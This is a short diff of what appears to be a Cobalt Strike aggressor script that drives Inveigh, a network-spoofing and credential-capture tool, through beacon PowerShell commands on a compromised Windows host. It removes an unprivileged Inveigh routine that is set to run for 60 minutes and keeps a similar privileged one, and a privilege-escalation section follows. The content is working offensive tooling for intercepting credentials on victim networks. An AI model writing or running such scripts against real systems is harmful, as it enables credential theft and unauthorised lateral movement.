@@ -40,21 +40,8 @@ sub inveigh {
     bpowershell($bid, "Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -RunTime 60");
 }
 
-# Run Invoke-InveighUnprivileged for 60 minutes
-sub inveighUnprivileged {
-    local('$bid');
-    $bid = 1;
-    bpowershell_import($bid, script_resource("scripts/Inveigh-Unprivileged.ps1"));
-    bcd($bid, "C:\\Temp");
-    bpowershell($bid, "Invoke-InveighUnprivileged -ConsoleOutput Y -FileOutput Y -RunTime 60");
-}
-
 alias inveigh {
     inveigh($1);
-}
-
-alias inveigh_unprivileged {
-    inveighUnprivileged($1);
 }
 
 #### PRIVESC
